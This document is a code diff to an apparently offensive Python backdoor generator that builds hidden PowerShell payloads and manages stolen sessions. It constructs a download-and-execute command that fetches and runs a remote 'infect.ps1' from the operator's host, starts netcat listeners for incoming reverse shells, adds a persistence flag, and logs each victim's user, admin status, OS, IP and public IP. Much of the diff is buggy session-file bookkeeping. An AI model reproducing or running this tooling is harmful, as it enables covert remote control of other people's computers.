@@ -28,6 +28,7 @@ def banner():
 def generate_bd():
     args = action
     for arg in args:
+        if "-p"  in arg or "--persistant": pers = True
         if "-os" in arg: osArg = arg; osT = osArg.split(osArg[3])[1]
         if "-T" in arg: timeArg = arg; timer = timeArg.split(timeArg[2])[1]
         else: timer = ""
@@ -64,11 +65,14 @@ def generate_bd():
         payloadT = 'powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/infect.ps1')"+'"'
 
         ip = f"{ip[0]}.{ip[1]}.{ip[2]}.{ip[3]}"
-        if timer == "start":
+        if not pers:
             print("\nPayload for Powershell : "+payloadS+"\n Waiting for connection on port : "+str(port)); os.system(f'{config["ncli"]} -lp '+str(port)); del_ver = input("you want del session?[Y/n]")
             if del_ver != "n" and del_ver != "N": os.system(f'rm -rf server/b4dboy/{id}')
-        elif timer == "store": print("\nPayload for Powershell : "+payloadT+"\n(for listen : start -s="+id+")"); input("[!] Press enter for start scanning (just )"); store_session(id, system, get_ip(ip), str(port), "", "")
-        else: print("\nPayload for Powershell (listen just after execution) : "+payloadS+"\nPayload for Powershell (store session) : "+payloadT+"\n(for listen in case of store session : start -s="+id+")"); store_session(id, system, get_ip(ip), str(port), "", "")
+            else: store_session(id, system, get_ip(), str(port), "", "")
+        else: 
+            print("\nPayload for Powershell : "+payloadT+"\n(for listen : start -s="+id+"")
+            input("Press enter to save session...")
+            store_session(id, system, port=str(port))
     
     elif osT == "linux":
         system = "Linux"
@@ -95,24 +99,26 @@ def mod_log():
             if "--mod" in arg:  id = arg.split(arg[5])[1].split("=")[0]
             else: id = arg.split(arg[2])[1].split("=")[0]
             for pars in range(2, len(args)):
-                print(pars)
                 if "=" in args[pars]: field = args[pars].split('=')[0]; value = args[pars].split('=')[1]
                 elif ":" in args[pars]: field = args[pars].split(':')[0]; value = args[pars].split(':')[1]
                 else: print("Unexpected value in : "+args[pars])
                 with open("logs/sessions.json", "r") as sesF:
                     sessData = sesF.read()
-                    lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
+                    lista = sessData[1:][:-1].replace(",{",",{{").split(",{")
                     sessData = []
-                    for arg in lista:
-                        sessData.append(json.loads(arg))
+                    for l in lista:
+                        sessData.append(json.loads(l))
                     for sess in sessData:
                         if sess['sess_id'] == id:
                             remove_session(id)
-                            if field == "os": store_session(sess['sess_id'], value, sess['ip'], sess['port'], sess['system'], sess['pubip'])
-                            elif field == "ip": store_session(sess['sess_id'], sess['os'], value, sess['port'], sess['system'], sess['pubip'])
-                            elif field == "port": store_session(sess['sess_id'], sess['os'], sess['ip'], value, sess['system'], sess['pubip'])
-                            elif field == "system": store_session(sess['sess_id'], sess['os'], sess['ip'], sess['port'], value, sess['pubip'])
-                            elif field == "pubip": store_session(sess['sess_id'], sess['os'], sess['ip'], sess['port'], sess['system'], value)
+                            if field == "user": store_session(sess['sess_id'], value, sess["admin"], sess["users"], sess["os"], sess["ip"], sess["port"], sess["system"], sess["pubip"])
+                            elif field == "admin": store_session(sess['sess_id'], sess["user"], value, sess["users"], sess["os"], sess["ip"], sess["port"], sess["system"], sess["pubip"])
+                            elif field == "users": store_session(sess['sess_id'], sess["user"], sess["admin"], value, sess["os"], sess["ip"], sess["port"], sess["system"], sess["pubip"])
+                            elif field == "os": store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], value, sess["ip"], sess["port"], sess["system"], sess["pubip"])
+                            elif field == "ip": store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess["os"], value, sess["port"], sess["system"], sess["pubip"])
+                            elif field == "port":store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess["os"], sess["ip"], value, sess["system"], sess["pubip"])
+                            elif field == "system": store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess["os"], sess["ip"], sess["port"], value, sess["pubip"])
+                            elif field == "pubip":store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess["os"], sess["ip"], sess["port"], sess["system"], value)
                             else: print("[-] Err : field on sessions data don´t exist. Please read the README.md for more info.")
                         os.system('clear')
                         banner()
@@ -145,6 +151,19 @@ def mod_log():
             with open("logs/sessions.json", "w") as sesF: sesF.write(""); sesF.close(); os.system('clear'); banner()
             print("[+] Data deleted successfully. ")
 
+def mod_sess(search, value, field, dato):
+    file = open('logs/sessions.json', 'r', encoding='utf8')
+    data = file.read()[1:][:-1].replace(',{',',{{').split(',{')
+    file.close()
+    file = open('logs/sessions.json', 'w', encoding='utf8')
+    file.write('[')
+    for d in data:
+        di = json.loads(d)
+        if di[search] == value: di[field] = dato
+        if data.index(d) == len(data)-1: file.write('\n    {\n        "sess_id":"'+di["sess_id"]+'",\n        "os":"'+di["os"]+'",\n        "ip":"'+di["ip"]+'",\n        "port":"'+di["port"]+'",\n        "system":"'+di["system"]+'",\n        "pubip":"'+di["pubip"]+'"\n    }')
+        else: file.write('\n    {\n        "sess_id":"'+di["sess_id"]+'",\n        "os":"'+di["os"]+'",\n        "ip":"'+di["ip"]+'",\n        "port":"'+di["port"]+'",\n        "system":"'+di["system"]+'",\n        "pubip":"'+di["pubip"]+'"\n    },')
+    file.write('\n]')
+
 def start_ses():
     ses = ""
     lst = ""
@@ -157,7 +176,7 @@ def start_ses():
     if ses != "":
         with open("logs/sessions.json", "r") as sesF:
             sessData = sesF.read()
-            lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
+            lista = sessData[1:][:-1].replace(",{",",{{").split(",{")
             sessData = []
             for arg in lista:
                 sessData.append(json.loads(arg))
@@ -165,6 +184,7 @@ def start_ses():
                 if ses == sess['sess_id']: port = sess['port']
         print("Waiting for connections on : "+port+"...  ¡This action may take 5 min!")
         os.system(f'{config["ncli"]} -lp '+port)
+        mod_sess("sess_id", ses, "ip", get_ip())
     elif lst != "":
         print("Waiting for connections on : "+lst)
         os.system(f'{config["ncli"]} -lp '+lst)
@@ -261,20 +281,21 @@ def make_id():
         id = id+(dictionary[r.randint(0, len(dictionary)-1)])
     return id
 
-def get_ip(ip):
-    os.system(f'sudo ./server.sh listen {ip[0]} {ip[1]} {ip[2]}')
+def get_ip():
     with open("output.txt", "r") as ipF:
         data = ipF.read().split('\n')[0].split(' -')[0]
     ipF.close()
     os.system('rm output.txt')
+    return data
 
-def store_session(id, osT, ip, port, system, pubip):
+def store_session(sess_id, user="", admin="", users=[], osT="", ip="", port="", system="", pubip=""):
     with open("logs/sessions.json", "r") as oldSes:
         oldData = oldSes.read()
     oldSes.close()
     with open("logs/sessions.json", "w") as sesF:
-        if oldData != "": sesF.write(f"{oldData[:-1]},"); sesF.write('{\n    "sess_id":"'+id+'",\n    "os":"'+osT+'",\n    "ip":"'+ip+'",\n    "port":"'+port+'",\n    "system":"'+system+'",\n    "pubip":"'+pubip+'"\n}\n]')
-        else: sesF.write('[\n{\n    "sess_id":"'+id+'",\n    "os":"'+osT+'",\n    "ip":"'+ip+'",\n    "port":"'+port+'",\n    "system":"'+system+'",\n    "pubip":"'+pubip+'"\n}\n]')
+        sesF.write('[')
+        if oldData != "": sesF.write(f"{oldData[:-1]},"); sesF.write('{\n    "sess_id":"'+sess_id+'",\n    "user":"'+user+'",\n    "admin":"'+admin+'",\n    "users":'+str(users).replace("'",'"',)+',\n    "os":"'+osT+'",\n    "ip":"'+ip+'",\n    "port":"'+port+'",\n    "system":"'+system+'",\n    "pubip":"'+pubip+'"\n}\n]')
+        else: sesF.write('{\n    "sess_id":"'+sess_id+'",\n    "user":"'+user+'",\n    "admin":"'+admin+'",\n    "users":'+str(users).replace("'",'"',)+',\n    "os":"'+osT+'",\n    "ip":"'+ip+'",\n    "port":"'+port+'",\n    "system":"'+system+'",\n    "pubip":"'+pubip+'"\n}\n]')
     sesF.close()
     os.system('clear')
     banner()
@@ -283,17 +304,16 @@ def store_session(id, osT, ip, port, system, pubip):
 def remove_session(id):
     with open("logs/sessions.json", "r") as sesF:
         sessData = sesF.read()
-        lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
+        lista = sessData[1:][:-1].replace(",{",",{{").split(",{")
         sessData = []
-        for arg in lista:
-            sessData.append(json.loads(arg))
-        for session in sessData:
-            if id == session['sess_id']:
-                sessData.remove(session)
+        for l in lista:
+            sessData.append(json.loads(l))
+        for sess in sessData:
+            if sess['sess_id'] == id: sessData.remove(sess)
     sesF.close()
     with open("logs/sessions.json", "w") as sesF: sesF.write(""); sesF.close()
     for sess in sessData:
-        store_session(sess['sess_id'], sess['os'], sess['ip'], sess['port'], sess['system'], sess['pubip'])
+        store_session(sess['sess_id'], sess["user"], sess["admin"], sess["users"], sess['os'], sess['ip'], sess['port'], sess['system'], sess['pubip'])
     os.system('clear')
     banner()
     print("[+] Session removed successfully")
